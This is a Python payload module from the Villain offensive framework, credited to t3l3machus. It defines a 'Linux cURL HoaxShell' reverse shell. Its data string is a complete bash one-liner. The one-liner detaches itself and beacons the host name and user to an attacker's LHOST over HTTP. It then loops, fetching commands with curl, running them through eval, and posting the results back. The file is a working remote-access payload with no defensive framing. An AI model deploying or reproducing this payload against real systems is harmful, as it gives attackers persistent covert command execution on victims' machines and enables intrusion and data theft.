# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Linux cURL HoaxShell',
        'Author' : 'Panagiotis Chartas (t3l3machus)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/t3l3machus/hoaxshell', 'https://revshells.com']
    }

    meta = {
        'handler' : 'hoaxshell',
        'type' : 'sh-curl',
        'os' : 'linux',
        'shell' : 'unix'
    }

    config = {
        'frequency' : 0.8
    }

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = 'nohup bash -c \'s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=http://;curl -s "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/*GETCMD*" -H "*HOAXID*: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r";echo $$;fi; fi; sleep *FREQ*; done;\' & disown'
